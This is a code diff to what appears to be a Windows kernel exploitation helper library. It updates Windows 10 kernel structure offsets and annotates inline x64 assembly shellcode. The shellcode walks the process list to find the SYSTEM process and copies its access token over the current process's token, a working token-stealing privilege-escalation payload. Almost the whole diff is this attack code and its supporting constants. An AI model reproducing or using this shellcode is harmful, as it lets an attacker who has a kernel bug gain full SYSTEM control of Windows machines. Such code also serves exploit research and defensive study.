@@ -3,6 +3,7 @@
 #include "asm.h"
 #include "log.h"
 #include "nt.h"
+#include <stdexcept>
 
 #pragma comment(lib, "ntdll.lib")
 
@@ -11,15 +12,21 @@ using namespace pwn::log;
 
 #ifndef __KERNEL_CONSTANTS__
 #ifdef __WIN10__
-#define KIINITIAL_THREAD  0x0188
-#define EPROCESS_OFFSET   0x00b8
-#define PROCESSID_OFFSET  0x02e0
-#define FLINK_OFFSET      0x02e8
-#define TOKEN_OFFSET      0x0358
-#define SYSTEM_PID        4
+
+//
+// Offset for Win10 RS6 x64
+//
+#define CURRENT_ETHREAD             0x0188
+#define EPROCESS_OFFSET             0x00b8
+#define PROCESSID_OFFSET            0x02e8
+#define EPROCESS_FLINK_OFFSET       0x02f0
+#define TOKEN_OFFSET                0x0360
+#define SYSTEM_PID                  4
+
+
 
 #elif defined(__WIN81__)
-#define KIINITIAL_THREAD  0x0188
+#define CURRENT_ETHREAD   0x0188
 #define EPROCESS_OFFSET   0x00b8
 #define PROCESSID_OFFSET  0x02e0
 #define FLINK_OFFSET      0x02e8
@@ -43,17 +50,21 @@ namespace pwn::kernel
 					"push rax ;"
 					"push rbx ;"
 					"push rcx ;"
-					"mov rax, gs:[" STR(KIINITIAL_THREAD) "] ;"
+					// nt!PsGetCurrentProcess
+					"mov rax, gs:[" STR(CURRENT_ETHREAD) "] ;"
 					"mov rax, [rax+" STR(EPROCESS_OFFSET) "] ;"
 					"mov rbx, rax ;"
-					"mov rbx, [rbx+" STR(FLINK_OFFSET) "] ;"
+					"mov rbx, [rbx+" STR(EPROCESS_FLINK_OFFSET) "] ;"
+					// look for SYSTEM EProcess
 					"__loop: "
-					"sub rbx, " STR(FLINK_OFFSET) " ;"
+					"sub rbx, " STR(EPROCESS_FLINK_OFFSET) " ;"
 					"mov rcx, [rbx+" STR(PROCESSID_OFFSET) "] ;"
 					"cmp rcx, " STR(SYSTEM_PID) " ;"
 					"jnz __loop ;"
+					// get its token value
 					"mov rcx, [rbx + " STR(TOKEN_OFFSET) "] ;"
 					"and cl, 0xf0 ;"
+					// overwrite our current process' token with it
 					"mov [rax + " STR(TOKEN_OFFSET) "], rcx ;"
 					"pop rcx ;"
 					"pop rbx ;"
@@ -64,17 +75,9 @@ namespace pwn::kernel
 				const size_t sclen = ::strlen(sc);
 				std::vector<BYTE> out;
 				if ( !pwn::assm::x64(sc, sclen, out) )
-					err(L"failed to compile shellcode\n");
+					throw std::runtime_error("failed to compile shellcode\n");
 				return out;
 			}
-		}
-
-
-		std::vector<BYTE> steal_system_token(void)
-		{
-#ifdef __x86_64__
-			return __steal_system_token_x64();
-#endif
 		}
 
 
@@ -82,6 +85,18 @@ namespace pwn::kernel
 		{
 			return std::vector<BYTE>({ 0x90, 0x90, 0xcc, 0xcc });
 		}
+
+
+		std::vector<BYTE> steal_system_token(void)
+		{
+#ifdef __x86_64__
+			return __steal_system_token_x64();
+#else
+			return debug_break();
+#endif
+		}
+
+
 	}
 		
 
